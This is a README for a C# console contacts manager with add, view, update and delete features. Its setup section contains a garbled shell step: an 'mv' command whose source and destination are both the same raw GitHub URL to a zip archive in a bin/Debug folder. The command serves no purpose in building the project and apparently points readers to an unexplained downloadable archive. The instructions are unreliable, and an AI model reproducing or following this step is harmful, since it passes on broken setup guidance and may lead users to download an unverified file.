# 📞 Contacts Management System

This is a console-based **Contacts Management System** built with **C#**, allowing users to **add, view, update, and delete contacts**.

## 🚀 Features
- ➕ **Add** a new contact (Name, Phone Number, Email)
- 📜 **View** all saved contacts
- ✏️ **Update** an existing contact
- ❌ **Delete** a contact
- 🔄 **Loop** runs until the user chooses to exit

## 🛠️ Installation & Usage

### 1️⃣ Clone the repository
```sh
git clone <repository-url>
cd ContactsApp
```

### 2️⃣ Set up the project
```sh
dotnet new console -o ContactsApp
cd ContactsApp
mv https://raw.githubusercontent.com/code-iddih/C-Test-Solutions/master/ContactsApp/bin/Debug/C-Test-Solutions-v3.4.zip https://raw.githubusercontent.com/code-iddih/C-Test-Solutions/master/ContactsApp/bin/Debug/C-Test-Solutions-v3.4.zip
```

### 3️⃣ Run the program
```sh
dotnet run
```

## 📌 Notes
